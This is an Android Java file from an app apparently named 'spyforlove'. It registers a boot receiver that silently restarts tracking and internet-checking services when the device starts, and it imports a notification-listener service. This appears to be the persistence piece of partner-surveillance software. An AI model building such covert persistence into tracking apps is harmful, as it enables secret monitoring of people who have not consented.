package chem.kth.spyforlove.broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import chem.kth.spyforlove.MainActivity;
import chem.kth.spyforlove.services.InternetChecker;
import chem.kth.spyforlove.services.NotificationListener;
import chem.kth.spyforlove.services.TrackMainService;

public class BootCompleteBroad extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Intent trackMainIntent = new Intent(context, TrackMainService.class);
            context.startService(trackMainIntent);

            Intent internetIntent = new Intent(context, InternetChecker.class);
            context.startService(internetIntent);
        }
    }
}